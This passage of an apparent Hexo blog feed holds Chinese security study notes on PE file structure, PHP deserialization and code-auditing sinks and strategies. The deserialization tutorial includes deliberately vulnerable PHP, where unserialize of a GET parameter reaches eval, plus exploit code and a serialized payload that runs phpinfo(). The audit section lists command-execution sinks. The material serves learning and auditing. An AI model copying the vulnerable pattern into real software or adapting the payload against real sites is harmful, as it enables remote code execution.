DOS存根</h3><p>位于DOS头的下方，为可选项且大小不固定。</p><p>notepad++的DOS存根：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84dos%E5%AD%98%E6%A0%B9.png" alt></p><blockquote><p>由于PE头中的DOS头中的e_lfanew指向的是NT头，说明中间的DOS存根是00000030 - 00000110的内容</p></blockquote><hr><h3 id="3-NT头（PE真正的头-IMAGE-NT-HEADERS）"><a href="#3-NT头（PE真正的头-IMAGE-NT-HEADERS）" class="headerlink" title="3. NT头（PE真正的头 - IMAGE_NT_HEADERS）"></a>3. NT头（PE真正的头 - IMAGE_NT_HEADERS）</h3><p>NT头 IMAGE_NT_HEADERS 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>具有三个成员：</p><ul><li><strong>签名 (504500，即PE00)</strong></li><li><strong>文件头</strong></li><li><strong>可选头</strong></li></ul><hr><h4 id="3-1-NT头中的文件头（IMAGE-FILE-HEADER）"><a href="#3-1-NT头中的文件头（IMAGE-FILE-HEADER）" class="headerlink" title="3-1. NT头中的文件头（IMAGE_FILE_HEADER）"></a>3-1. NT头中的文件头（IMAGE_FILE_HEADER）</h4><p>NT头中的文件头结构 IMAGE_FILE_HEADER 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/nt%E5%A4%B4%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><p>具有四个重要的成员：</p><ul><li>Machine：用于标识Machine码</li><li>NumberOfSections：用于指出文件中存在的节区数量</li><li>SizeOfOptionalHeader：用于指出 IMAGE_OPTIONAL_HEADER32 结构体的长度，其中IMAGE_OPTIONAL_HEADER32 是NT头最后一个成员</li><li>Characterstics：用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息</li></ul><p>notepad的文件头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><hr><h4 id="3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）"><a href="#3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）" class="headerlink" title="3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）"></a>3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）</h4><p>IMAGE_OPTIONAL_HEADER32是PE头结构中最大的结构体</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B41.png" alt></p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B42.png" alt></p><p>其中重要的成员：</p><ul><li>Magic：Magic为10B-20B</li><li><strong>AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码的起始地址</strong></li><li><strong>ImageBase：指出文件的优先装入地址</strong></li><li>SectionAlignment，FileAlignment：分别指出节区在磁盘中的最小单位和节区在内存中最小单位</li><li>SizeOfImage：指出了PE Image在虚拟内存中所占空间大小</li><li>SizeOfHeader：指出整个PE头的大小</li><li>Subsystem：区分系统驱动和普通的可执行文件</li><li>NumberOfRvaAndSize：指出DataDirectory数组的个数</li><li>DataDirectory：IMAGE_DATA_DIRECTORY结构体组成的数组</li></ul><hr><h3 id="4-节区头（-IMAGE-SECTION-HEADER）"><a href="#4-节区头（-IMAGE-SECTION-HEADER）" class="headerlink" title="4. 节区头（ IMAGE_SECTION_HEADER）"></a>4. 节区头（ IMAGE_SECTION_HEADER）</h3><p>节区头是由 IMAGE_SECTION_HEADER 结构体组成的数组。每个结构体对应着一个节区</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/%E8%8A%82%E5%8C%BA%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中重要的成员：</p><ul><li>VirtualSize：内存中节区所占大小</li><li><strong>VirtualAddress：内存中节区起始地址（其实是RVA）</strong></li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li><strong>PointerToRawData：磁盘文件中节区起始位置</strong></li><li>Charaterstics：节区属性（bit OR）</li></ul><blockquote><p>VirtualAddress与PointerToRawData不带任何值，分别由SectionAlignment和FileAlignment确定</p></blockquote><blockquote><p>一般来说VirtualSize和SizeOfRawData具有不同的值，即磁盘中节区大小与加载到内存中的节区大小是不同的</p></blockquote><h2 id="PE由磁盘映射到内存"><a href="#PE由磁盘映射到内存" class="headerlink" title="PE由磁盘映射到内存"></a>PE由磁盘映射到内存</h2><p>PE文件加载到内存，每个<strong>节区</strong>都能完成<strong>内存地址与文件偏移</strong>之间的映射。这种映射一般叫做 RVA to RAW </p><p>计算这种映射的方法：</p><ul><li>查找RVA所在的节区</li><li>根据<strong>节区头</strong>使用下面公式计算文件偏移RAW</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAW - PointerToRawData = RVA - VirtualAddress</span><br><span class="line">即</span><br><span class="line">RAW = RVA - VirtualAddress + PpinterToRawData</span><br><span class="line">文件相对偏移 = 内存地址偏移 - 所在节区起始地址偏移 + 文件节区起始地址</span><br></pre></td></tr></table></figure><h2 id="RVA-转-RAW-练习"><a href="#RVA-转-RAW-练习" class="headerlink" title="RVA 转 RAW 练习"></a>RVA 转 RAW 练习</h2><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><p><strong>Q1. RVA=5000,File Offset=?</strong></p><p>答：由RVA = 5000，加上内存中的基址可以得到该位置的VA是 01005000，对照内存地址可以知道它位于第一个节区即 .text 段。所以我们用该位置的偏移地址大小 RVA 减去 .text 段的偏移地址大小 1000 可以得到该位置在 .text 段的偏移大小为 4000。随后在文件中找到 .text 在文件中的起始位置并加上计算所得的 4000 得到在该位置在文件在文件中的偏移 RAW = 4000+400 = 4400</p><p><strong>Q2. RVA=13314,File Offset=?</strong></p><p>答：同上。RVA 找到对应节区为第三个节区即 .rsrc 段。减去内存中 .rsrc 的段偏移即 13314 - B000 =  8314。然后在文件找到 .rsrc 的起始位置为 8400 。加上刚刚所得的偏移即 8400 + 8314 = 10714</p><p><strong>Q3. RVA=ABA8,File Offset=?</strong></p><p>答：继续同上。RVA 找到对应的节区为第二个节区即 .data段。减去内存中 .data 的段偏移即 ABA8 - 9000 = 1BA8。然后在文件找到 .data 的起始位置为 7C00 。加上刚刚所得的偏移即 7C00 + 1BA8 = 97A8。</p><p>但是我们可以看到这样计算的话，这个位置在内存中位于第二个节区而在文件中却是位于第三个节区。这显然是错误的答案。这种情况表明 <strong>“无法定位与RVA相对应的RAW值”</strong>。</p><p>原因是：<strong>第二个节区的 VirtualSize 值比 SizeOfRawData 值大</strong>，具体的原因就在下面揭晓。</p><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>Import Address Table，导入地址表。IAT 是一个表格，用来记录程序正在使用哪些库中的函数。</p><h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><p>Dynamic Linked Library，动态链接库。</p><ul><li>不要把库包含到程序中，单独组成DLL代码，需要时调用即可</li><li>内存映射技术使得加载后的DLL代码资源可以共享</li><li>更新库时只需要替换相关DLL即可</li></ul><p>加载DLL的方式</p><ul><li>显式链接：程序<strong>使用DLL时</strong>加载，使用完毕就释放内存</li><li>隐式链接：程序<strong>开始一同加载</strong>DLL，程序终止释放内存（IAT机制于此有关）</li></ul><h2 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE__IMPORT_DESCRIPTOR"></a>IMAGE__IMPORT_DESCRIPTOR</h2><p>该结构体记录了PE文件需要导入那些库文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>暂时先写到这里，后面还有好多…等慢慢补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PE文件&quot;&gt;&lt;a href=&quot;#PE文件&quot; class=&quot;headerlink&quot; title=&quot;PE文件&quot;&gt;&lt;/a&gt;PE文件&lt;/h1&gt;&lt;p&gt;继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-01-27T07:29:41.000Z</published>
    <updated>2020-01-27T10:00:45.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容</p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><ul><li>序列化：将<code>对象或者数组（变量）</code>转换为一个<code>（可保存/传输）字符串</code></li><li>反序列化：将序列化后的得到的<code>字符串</code>反序列化为其<code>原始的对象结构</code></li></ul><p>php中常用的序列化和反序列化的函数有：</p><p><code>serialize、unserialize、json_encode、json_decode</code></p><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>通过序列化操作，可以将<code>变量转化为字符串</code>。进而可以方便的进行<code>存储和传输</code>，减轻服务器的压力</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个”精心”构造的序列化字符串，从而<code>控制对象</code>内部的<code>变量</code>甚至是<code>函数</code>，从而达成攻击的目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li>__construct() ：构造函数。当对象创建（new）时会自动调用。但在unserialize()时不会自动调用</li><li>__destruct() ：析构函数。在对象被销毁时会自动调用</li><li>__toString() ：当一个对象被当作一个字符串时就会调用。</li><li>__sleep() ：在对象被序列化之前运行</li><li>__wakeup() ：在对象被反序列化之后被调用</li></ul><p>调用的顺序如下面的程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'construct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'destruct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'wakeup run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'sleep run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'toString run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'string '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$s_a = serialize($a);</span><br><span class="line"><span class="comment">#var_dump($s_a);</span></span><br><span class="line">$un_a = unserialize($s_a);</span><br><span class="line"><span class="keyword">echo</span> $un_a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行的结果如下所示：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%93%E6%9E%9C.png" alt></p><p>分析一下上面出现结果的顺序原因：</p><p>首先我调用了new实例化了一个<code>对象 $a</code> ，这时候就会自动调用了construct；</p><p>其次我对实例化出来的<code>对象 $a</code> 进行序列化操作，在序列化操作前会先执行 sleep函数，然后在对对象进行序列化得到<code>字符串$s_a</code>；</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt></p><blockquote><p>注：上图中出现的字符串结果是去掉源码中注释符后重新运行代码由 var_dump($s_a) 所得</p></blockquote><p>然后执行到了unserialize 函数，调用后先对序列化<code>字符串 $s _a</code> 进行反序列化得到<code>对象 $un_a</code> 后再自动调用 wakeup方法；</p><p>然后调用echo函数，<code>$un_a 对象</code>被当作字符串，自动调用了toString方法；</p><p>最后程序执行结束，构造的两个<code>对象 $un_a 和 $a</code> 被释放，自动调用了两次析构函数destruct；</p><p>至此，我们对序列化和反序列化以及魔术方法的调用有了一定的认识</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>用一个在网上随便找来的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"x1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2  = <span class="keyword">new</span> maniac();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们定位到了反序列化操作 unserialize ，其中参数 test 是我们可控的变量</p><p>很明显，我们的目标是调用 类 x2 中的 eval 方法，但他<code>不是写在魔术方法</code>中，不能直接通过反序列化进行控制。</p><p>继续观察，看到了 maniac 类中的 destruct 魔术方法可以控制 $test 成员变量（一个类）中的 action 方法。</p><p>我们就可以构成利用链： 通过 test 参数传入 maniac 类的序列化字符串，其中的 test 指定为 x2 。这样当程序执行到 unserialize 的时候就会先反序列化操作，随后程序执行完毕，对象销毁而调用危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EXP编写如下：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2=<span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$answer = <span class="keyword">new</span> maniac();</span><br><span class="line">print_r(serialize($answer));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后得到我们的 PAYLOAD:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"maniac"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;O:<span class="number">2</span>:<span class="string">"x2"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个坑点就是 phpinfo(); 后面如果没有加上 ‘ ; ‘ ，就会执行失败。</p></blockquote><p>在wamp环境下执行的结果如下：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo%E7%BB%93%E6%9E%9C.png" alt></p><p>可以看到上面的利用链构造成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP的反序列只是弟弟知识，以后补上java的这部分的知识。把web的填满，再继续底层的研究，继续努力</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;&lt;p&gt;从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计函数</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/</id>
    <published>2019-12-27T14:59:56.000Z</published>
    <updated>2020-02-19T06:27:08.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计函数"><a href="#代码审计函数" class="headerlink" title="代码审计函数"></a>代码审计函数</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL较多发生于下面这些功能点上：</p><ul><li>登录页面</li><li>获取HTTP头（user-agent/client-ip)</li><li>订单处理（常发生二次注入）</li></ul><blockquote><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 。</p><p>即处理这个输入时进行了转义，但是存储进数据库中又变成了脏数据，然后使用到这个脏数据时就会发生注入。</p></blockquote><p>普通注入关注函数：</p><ul><li>select from</li><li>mysql_connect</li><li>mysql_query</li><li>mysql_fetch_row</li><li>update</li><li>insert</li><li>delete</li></ul><p>编码注入关注函数：</p><ul><li>urldecode/rawurldecode</li><li>mysql_set_charset(‘GBK’)</li></ul><p>防范方法：</p><ul><li>gpc/runtime魔术引号 （PHP配置）</li><li>转义类函数<ul><li>addslashes对单双引号、反斜杠和空字符进行转义</li><li>mysq_ [ real_ ] escape_string同理对指定字符串进行转义</li></ul></li><li>intval等字符转换（适用于int型注入）</li><li>PDO预编译</li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF关注函数：</p><ul><li>curl</li><li>file_get_content</li><li>fsockopen</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS漏洞关键在于：寻找没有被过滤的参数和输出这些参数的输出函数</p><p>XSS关注函数：</p><ul><li>print</li><li>print_r</li><li>echo</li><li>printf</li><li>sprinf</li><li>sprintf</li><li>die</li><li>var_dump</li><li>var_export</li></ul><p>防范：</p><ul><li>对特殊字符 ‘  “  &lt; &gt; \ : and &amp; # 在输出和二次调用时进行HTML实体转义</li><li>黑白名单方式拦截标签事件属性（自定义正则规则）</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF主要是用于越权，常发生于控制权限的地方：</p><ul><li>管理后台</li><li>会员中心</li><li>论坛帖子</li><li>交易管理</li></ul><p>关注点：</p><ul><li><p>黑盒方法：</p><ul><li>抓包看有没有token</li><li>去掉refer再重发一次看响应是否一样</li></ul></li><li><p>白盒方法：</p><ul><li>查看引用的核心基础文件有没有token关键字或者验证操作</li></ul></li></ul><p>防范方法：</p><ul><li>token</li><li>验证码</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含关注的地方：模块加载，cache调用的地方</p><p>文件包含关注函数：</p><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><blockquote><p>once ： 只包含一次</p><p>require ： 包含并执行，报错就退出程序</p><p>include ： 包含并执行，报错也继续执行下面的代码</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件上传关注函数：</p><ul><li>move_uploaded_file</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>关注函数：</p><ul><li>eval</li><li>assert</li><li>call_user_func_array</li><li>preg_replace</li><li>call_user_func</li><li>动态函数 $a($b)</li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>关注函数：</p><ul><li>system</li><li>exec</li><li>passthru</li><li>shell_exec</li><li>popen</li><li>proc_open</li><li>pcntl_exec</li></ul><p>防范方法：</p><p>用白名单对用户输入进行过滤</p><ul><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用 escapeshellarg()函数来处理命令参数</li><li>使用 safe_mode_exec_dir 指定可执行文件的路径</li></ul><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>变量覆盖关注函数：</p><ul><li>extract</li><li>parse_str</li><li>import_request_variables</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP代码审计还有很多内容。这里就简单的写一下就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计函数&quot;&gt;&lt;a href=&quot;#代码审计函数&quot; class=&quot;headerlink&quot; title=&quot;代码审计函数&quot;&gt;&lt;/a&gt;代码审计函数&lt;/h1&gt;&lt;h2 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计思路</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</id>
    <published>2019-12-27T14:57:56.000Z</published>
    <updated>2020-02-09T06:33:13.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h1><p>面试的时候问到了关于代码审计的思路，这里就简单总结一下。</p><p>常见的代码审计思路有以下四种：</p><ul><li>根据敏感关键字回溯参数传递过程；  （PS：即找敏感函数逆向回溯参数是否可控）</li><li>查找可控变量，正向追踪变量传递过程； （PS：即直接找可控参数正向追踪到漏洞处）</li><li>寻找敏感功能点，通读功能点代码；   （PS：即分业务功能去审计，重点关注易出现漏洞的功能如upload等）</li><li>直接通读全文代码。   （PS：直接怼项目所有文件，重点放在通防文件、配置文件、入口文件、通用函数文件等）</li></ul><h2 id="一、敏感函数回溯参数过程"><a href="#一、敏感函数回溯参数过程" class="headerlink" title="一、敏感函数回溯参数过程"></a>一、敏感函数回溯参数过程</h2><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。另外非函数使用不当的漏洞，如SQL注入，等以后学习再详细介绍。这种方式的优缺点如下：</p><ul><li>优点：只需搜索相应敏感关键字，即可快速挖掘想要的漏洞，可定向挖掘，高效、高质量；</li><li>缺点：由于没有通读代码，对程序整体架构了解不够深入，在挖掘漏洞时定位利用会花点时间，另外对逻辑漏洞挖掘覆盖不到。</li></ul><h2 id="二、通读全文代码"><a href="#二、通读全文代码" class="headerlink" title="二、通读全文代码"></a>二、通读全文代码</h2><p>通读全文代码也有一定的技巧，否则很难读懂Web程序的，也很难理解代码的业务逻辑。首先我们要看程序的大体结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，另外还要注意文件的大小，创建时间，就可以大概知道这个程序实现了那些功能，核心文件有哪些。</p><p>在看目录结构的时候，特别注意以下几个文件：</p><ul><li><strong>函数集文件</strong><br>函数集文件通常命名中包含<strong>functions或者common等关键字</strong>，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件的一个技巧就是打开index.php或者一些功能性文件。</li><li><strong>配置文件</strong><br>配置文件通常命名中包含config关键字，配置文件包括Web程序运行必须的<strong>功能性配置选项以及数据库等配置信息</strong>。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数是用单引号还是双引号，如果是双引号，则很可能会存在代码执行漏洞。</li><li><strong>安全过滤文件</strong><br>安全过滤文件对我们做代码审计至关重要，通常命名中有<strong>filter、safe、check</strong>等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li><li><strong>index文件</strong><br>index是一个程序的<strong>入口文件</strong>，所以我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。</li></ul><h2 id="三、根据功能点定向审计"><a href="#三、根据功能点定向审计" class="headerlink" 